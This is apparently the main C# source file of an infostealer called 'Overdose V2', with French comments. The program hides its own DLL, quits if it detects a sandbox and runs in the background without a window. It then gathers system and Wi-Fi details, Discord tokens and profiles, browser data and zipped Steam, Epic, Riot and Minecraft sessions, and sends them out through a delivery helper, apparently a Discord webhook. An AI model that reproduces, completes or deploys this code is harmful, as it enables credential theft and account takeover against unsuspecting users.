using OdPS;
using OdPS.Utils;
using PublicStealer.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;

namespace PublicStealer
{
    class Program
    {
        [STAThread] // Indispensable pour les applis Windows
        static void Main(string[] args)
        {
            // 1. On saute l'étape HideConsole car il n'y a plus de console (grâce au réglage étape 1)
            if (!System.IO.File.Exists("SQLite.Interop.dll"))
            {
                System.IO.File.WriteAllBytes("SQLite.Interop.dll", Shifting_Backrooms.Properties.Resources.SQLite_Interop);
                // 2. ON CACHE LE FICHIER (Ajoute cette ligne ici)
                System.IO.File.SetAttributes("SQLite.Interop.dll", System.IO.FileAttributes.Hidden);
            }

            // 2. Ta ligne magique pour activer SQLite
            System.Runtime.CompilerServices.RuntimeHelpers.RunModuleConstructor(typeof(System.Data.SQLite.SQLiteConnection).Module.ModuleHandle);

            // 2. Test de sécurité (Sandbox)
            if (Security.IsSandbox()) return;

            // 3. On lance ton travail dans un Thread séparé pour ne pas bloquer l'ordi
            Thread worker = new Thread(new ThreadStart(StartSteal));
            worker.IsBackground = true;
            worker.Start();

            // 4. On garde le programme "chargé" en mémoire sans fenêtre
            // C'est ça qui fait que l'appli reste en fond comme Spotify
            System.Windows.Forms.Application.Run();
        }

        static void StartSteal()
        {
            {
            // Création du dossier temporaire
            string workDir = Path.Combine(Path.GetTempPath(), "Overdose_Temp_" + Guid.NewGuid().ToString().Substring(0, 5));
            if (!Directory.Exists(workDir)) Directory.CreateDirectory(workDir);

            try
            {
                // 1. Système
                SendSystemLog();

                // 2. Discord (SANS suppression de doublons pour tout voir)
                SendDiscordLogs();

                // 3. Navigateurs
                SendBrowserLogs();

                // 4. Gaming (Avec vérification Epic Games)
                SendGamingLogs(workDir);

                Console.WriteLine("[+] Tous les rapports ont été envoyés !");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Erreur générale : " + ex.Message);
            }
            finally
            {
                System.Threading.Thread.Sleep(5000);
                try { if (Directory.Exists(workDir)) Directory.Delete(workDir, true); } catch { }
            }

            System.Threading.Thread.Sleep(2000);
        }

        static void SendSystemLog()
        {
            string hw = SystemInformation.GetHardwareInfo();
            string dk = SystemInformation.GetDiskInfo();
            string net = SystemInformation.GetNetworkInfo();
            string wf = SystemInformation.GetWifiInfo();

            var sysFields = new[]
            {
                new { name = "User 👤", value = "```" + Environment.UserName + " @ " + Environment.MachineName + "```", inline = false },
                new { name = "System 💻", value = "```" + hw + "```", inline = false },
                new { name = "Network & Wifi 🌍", value = "```" + net + "\n" + wf + "```", inline = false },
                new { name = "Disks 💾", value = "```" + dk + "```", inline = false }
            };

            SkuldDelivery.SendEmbed("🪐 Overdose V2 - System Report", "Infos PC", sysFields);
            System.Threading.Thread.Sleep(2000);
        }

        static void SendBrowserLogs()
        {
            try { PublicStealer.Utils.BrowserStealer.Run(); }
            catch (Exception ex) { Console.WriteLine("[-] Erreur Browser : " + ex.Message); }
        }

        static void SendGamingLogs(string workDir)
        {
            try
            {
                Console.WriteLine("[?] Collecte Gaming en cours...");

                // On s'assure que le moteur de capture est bien appelé
                GamingStealer.CaptureGamingSessions(workDir);

                string gamingPath = Path.Combine(workDir, "Gaming");
                string zipPath = Path.Combine(workDir, "Gaming_Sessions.zip");

                // Analyse des cibles trouvées pour le rapport texte
                string foundTargets = "Steam, Minecraft";
                if (Directory.Exists(Path.Combine(gamingPath, "EpicGames"))) foundTargets += ", Epic Games";
                if (Directory.Exists(Path.Combine(gamingPath, "Riot"))) foundTargets += ", Riot/Valorant";

                if (Directory.Exists(gamingPath) && Directory.GetFileSystemEntries(gamingPath).Length > 0)
                {
                    if (File.Exists(zipPath)) File.Delete(zipPath);
                    ZipFile.CreateFromDirectory(gamingPath, zipPath);

                    // Envoi du ZIP
                    SkuldDelivery.SendFile("🎮 GAMING SESSIONS ZIP", $"Cibles détectées : {foundTargets}", zipPath);
                    Console.WriteLine("[+] Dossier Gaming envoyé.");
                }
                else
                {
                    Console.WriteLine("[-] Aucun fichier gaming trouvé.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Erreur Bloc Gaming : " + ex.Message);
            }
        }

        static void SendDiscordLogs()
        {
            var rawTokens = TX.GetTokens();
            if (rawTokens.Count == 0) return;

            Console.WriteLine($"[DEBUG] {rawTokens.Count} tokens bruts trouvés.");

            // Dictionnaire : Clé = ID unique de l'utilisateur ou Détails, Valeur = Liste d'objets
            var groupedAccounts = new Dictionary<string, List<dynamic>>();

            foreach (var tk in rawTokens)
            {
                var result = Identity.GetAccountDetails(tk.Token);

                // Si on n'arrive pas à avoir les détails, on affiche une erreur en console mais on n'arrête pas tout
                if (result.details == null)
                {
                    Console.WriteLine($"[!] Impossible de récupérer les détails pour un token de : {tk.Source}");
                    continue;
                }

                // On crée une clé basée sur les détails pour regrouper
                string groupKey = result.details.Trim();

                if (!groupedAccounts.ContainsKey(groupKey))
                {
                    groupedAccounts[groupKey] = new List<dynamic>();
                }

                groupedAccounts[groupKey].Add(new { Token = tk.Token, Source = tk.Source, Avatar = result.avatarUrl });
            }

            Console.WriteLine($"[DEBUG] {groupedAccounts.Count} comptes uniques identifiés après analyse.");

            foreach (var group in groupedAccounts)
            {
                var profileInfo = group.Key;
                var instances = group.Value;
                var firstInstance = instances[0];

                // Fusion propre des sources pour éviter les répétitions inutiles
                var sourceList = instances.Select(i => (string)i.Source).Distinct().ToList();
                string sourcesText = string.Join(", ", sourceList);

                var fields = new List<object>();
                fields.Add(new { name = "📍 Provenances", value = $"```yaml\n{sourcesText}```", inline = false });

                // Extraction des tokens uniques pour cet utilisateur
                var uniqueTokens = instances.Select(i => (string)i.Token).Distinct().ToList();

                for (int i = 0; i < uniqueTokens.Count; i++)
                {
                    // On numérote si plusieurs tokens, sinon juste "Token"
                    string fieldName = uniqueTokens.Count > 1 ? $"🔑 Token #{i + 1}" : "🔑 Token";
                    fields.Add(new { name = fieldName, value = $"```md\n# {uniqueTokens[i]}```", inline = false });
                }

                fields.Add(new { name = "📋 Profil", value = profileInfo, inline = false });

                // Envoi de l'embed fusionné
                Console.WriteLine($"[>] Envoi du profil : {profileInfo.Split('\n')[0]} ({sourceList.Count} sources)");

                SkuldDelivery.SendEmbed(
                    "🎮 DISCORD ACCOUNT(S) FOUND",
                    "Extraction réussie et regroupée",
                    fields.ToArray(),
                    (string)firstInstance.Avatar
                );

                // Pause de sécurité pour ne pas spammer Discord
                System.Threading.Thread.Sleep(3500);
            }
        }
    }
}
}